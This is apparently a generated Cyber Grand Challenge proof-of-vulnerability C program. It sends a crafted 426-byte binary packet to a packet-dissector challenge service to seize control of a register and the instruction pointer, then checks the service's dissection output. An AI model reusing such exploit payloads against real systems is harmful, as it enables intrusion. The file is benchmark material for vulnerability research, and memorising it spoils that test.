#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xaa\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x92\x01\x00\x00\x8a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x8a\x01\x00\x00"
         "\xc8\xa5\x2c\x34\x04\xd1\xd8\xdb\xaf\x3d\x30\x1f\x5d\x76\x99\x5b"
         "\x8b\x48\x75\xf1\x0d\x00\x00\x00\x41\x00\x01\x2b\x19\x17\xe9\x0c"
         "\xfb\xd4\x67\xc7\xa7\xbe\xb7\x87\x50\xcf\x84\x60\x01\xf3\x41\x00"
         "\xea\xdc\xfc\x01\xa8\x5c\xc8\x6a\x26\xa9\xce\xce\x28\x01\xc5\x01"
         "\x14\xff\x25\x57\xee\xcf\x21\x9f\x4f\xa9\xd4\x3e\xc8\x5f\x76\x87"
         "\x36\x40\x80\x37\x98\xf5\xf5\x84\x22\x6b\x77\xf9\x88\x6a\x3c\x7a"
         "\x14\x5d\x5b\x6c\x54\x30\xce\x72\x82\xcd\x38\xce\xd0\xb9\xe5\x9c"
         "\xa6\x78\x8b\x9d\x2d\xd6\x31\x9c\x5b\x39\x4d\x62\x7f\xb9\x60\x53"
         "\x45\xaf\xc0\xd2\x73\xdb\xbe\x39\x16\x69\xfa\x80\x92\x64\x9e\x04"
         "\x27\x54\xe5\x1d\x89\xab\x61\x7f\x86\x7f\xcf\xd0\xa7\x30\x1a\x73"
         "\x7d\x0f\x98\xb3\x7f\x53\x1c\xc0\x49\xfc\xee\x99\x1d\x0b\x44\xd9"
         "\x53\x55\xab\xb8\xe9\x53\xfc\x96\x3a\x15\x38\xd7\x70\x43\xa3\x9e"
         "\x31\xf0\x3a\x21\x8a\x71\xec\x77\x03\x45\x69\x88\x8f\x11\x05\x2a"
         "\x3a\x20\xbf\x56\x94\xeb\xa5\xbd\xaf\x00\x22\xdf\xde\x4d\xed\x0a"
         "\x9c\xf9\xbf\x19\x7b\xd6\x2a\xa5\x4c\xc1\x4e\x27\xe1\x83\x84\xa9"
         "\x2b\xdc\x43\x1d\x18\xb3\xe0\xda\xe5\xe8\xe4\x72\xd6\xf0\x23\x32"
         "\x5c\x60\xe6\x9e\x87\x47\x66\x83\x1e\x90\x94\xce\x1e\x72\x45\x27"
         "\xf9\x3e\xb6\x60\xf4\xaa\x25\xe6\x9d\xfe\xd5\x55\x46\xa2\x84\x2f"
         "\x59\xea\xb7\x8f\x6e\x43\xa0\x25\x18\xad\x51\xf8\x2b\x7e\xff\x67"
         "\x8d\x43\xe4\xb1\x9c\x00\x01\xd7\x59\x7d\xda\x9e\x85\x6e\x10\x6e"
         "\x1a\x01\x00\x84\x55\x4c\x4d\x97\x96\xd3\xb7\xb4\x58\xfe\xce\x5c"
         "\xfb\x34\xf8\x4e\x16\x79\x29\xb9\x19\x60\x8d\x88\xec\xb2\x68\x56"
         "\x6a\x6e\xb9\x2c\x41\x00\xd3\x9d\x5f\x57\xca\xc8\x01\xff\xce\xeb"
         "\xa3\xc3\x2b\x90\x2a\x36\x5f\xa6\x7f\x72\x6a\x58\x47\x4a\xe4\x37"
         "\x1d\x78\xc0\x01\x00\xb3\xed\x13\xd3\x00";
      static unsigned int write_00001_00000_len = 426;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamatelodendron
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x74\x65\x6c\x6f\x64\x65"
         "\x6e\x64\x72\x6f\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
